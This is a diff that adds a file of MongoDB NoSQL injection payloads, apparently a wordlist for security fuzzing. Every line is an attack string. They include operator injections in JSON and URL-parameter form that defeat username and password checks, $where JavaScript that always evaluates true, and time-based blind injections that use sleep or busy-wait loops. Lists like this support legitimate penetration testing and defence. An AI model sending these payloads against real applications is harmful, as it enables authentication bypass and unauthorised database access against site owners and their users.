@@ -1,0 +1,42 @@
+# MongoDB NoSQL Injection Payloads
+{"$gt":""}
+{"$ne":""}
+{"$gt":0}
+{"$ne":0}
+{"$exists":true}
+{"$regex":".*"}
+{"$regex":"^a"}
+{"$in":["admin","root"]}
+{"$nin":[""]}
+{"$where":"1==1"}
+{"$where":"sleep(5000)"}
+{"$where":"this.password.match(/.*/)"}
+[$gt]=
+[$ne]=
+[$exists]=true
+[$regex]=.*
+[$in][]=admin
+[$nin][]=
+[$gt]=&password[$gt]=
+[$ne]=1&password[$ne]=1
+username[$gt]=&password[$gt]=
+username[$ne]=toto&password[$ne]=toto
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$ne":""},"password":{"$ne":""}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+{"username":{"$in":["admin","root","administrator"]},"password":{"$gt":""}}
+{"$or":[{"username":"admin"},{"username":"root"}]}
+{"username":"admin","password":{"$gt":""}}
+{"username":"admin","$or":[{},{"password":{"$gt":""}}]}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+'; return '' == '
+'; return true; var a='
+1; return true
+';sleep(5000);var a='
+';var d=new Date();do{var cd=new Date();}while(cd-d<5000);var a='
+{"$where":"function(){sleep(5000);return true;}"}
+{"$where":"function(){var d=new Date();do{var cd=new Date();}while(cd-d<5000);return true;}"}
